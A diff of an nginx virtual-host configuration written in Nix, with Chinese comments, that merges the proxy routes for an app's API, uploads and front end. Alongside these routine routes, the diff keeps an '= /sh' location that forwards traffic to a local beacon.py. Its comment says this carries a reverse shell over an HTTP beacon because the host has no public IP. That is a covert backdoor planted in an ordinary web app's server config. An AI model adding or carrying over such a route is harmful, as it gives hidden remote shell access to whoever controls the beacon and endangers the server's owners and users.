@@ -34,49 +34,28 @@ in
           }
         ];
 
-        # 后端 API
-        locations."/api/" = {
-          proxyPass = "http://127.0.0.1:8000/api/";
-          proxyWebsockets = true;
-          extraConfig = ''
-            proxy_set_header Host $host;
-            proxy_set_header X-Real-IP $remote_addr;
-            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-            proxy_set_header X-Forwarded-Proto $scheme;
-          '';
-        };
+        # 后端 API / 上传的图片
+        locations =
+          lib.genAttrs ["/api/" "/uploads/"] (path: {
+            proxyPass = "http://127.0.0.1:8000${path}";
+            proxyWebsockets = true;
+          })
+          // {
+            # 无公网 IP：反向 shell 走 HTTP 信标（beacon.py 监听 127.0.0.1:8899，长轮询，别缓冲）
+            "= /sh" = {
+              proxyPass = "http://127.0.0.1:8899";
+              extraConfig = ''
+                proxy_read_timeout 60s;
+                proxy_buffering off;
+              '';
+            };
 
-        # 无公网 IP：反向 shell 走 HTTP 信标（beacon.py 监听 127.0.0.1:8899，长轮询，别缓冲）
-        locations."= /sh" = {
-          proxyPass = "http://127.0.0.1:8899";
-          extraConfig = ''
-            proxy_read_timeout 60s;
-            proxy_buffering off;
-          '';
-        };
-
-        # 上传的图片
-        locations."/uploads/" = {
-          proxyPass = "http://127.0.0.1:8000/uploads/";
-          extraConfig = ''
-            proxy_set_header Host $host;
-            proxy_set_header X-Real-IP $remote_addr;
-            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-            proxy_set_header X-Forwarded-Proto $scheme;
-          '';
-        };
-
-        # 前端 (Vite dev / 静态文件)
-        locations."/" = {
-          proxyPass = "http://127.0.0.1:5173/";
-          proxyWebsockets = true;
-          extraConfig = ''
-            proxy_set_header Host $host;
-            proxy_set_header X-Real-IP $remote_addr;
-            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-            proxy_set_header X-Forwarded-Proto $scheme;
-          '';
-        };
+            # 前端 (Vite dev / 静态文件)
+            "/" = {
+              proxyPass = "http://127.0.0.1:5173/";
+              proxyWebsockets = true;
+            };
+          };
       };
     };
 
